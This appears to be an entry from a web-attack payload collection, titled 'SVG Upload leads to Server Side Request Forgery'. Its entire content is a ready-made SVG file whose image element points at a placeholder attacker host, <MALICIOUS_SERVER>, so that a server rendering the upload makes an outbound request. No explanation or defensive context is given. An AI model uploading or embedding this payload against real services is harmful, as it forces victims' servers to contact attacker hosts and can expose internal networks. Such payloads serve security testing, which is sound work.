# SVG Upload leads to Server Side Request Forgery

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
<image height="30" width="30" xlink:href="http://<MALICIOUS_SERVER>/example.png" />
<text x="0" y="20" font-size="20">test</text>
</svg>
```
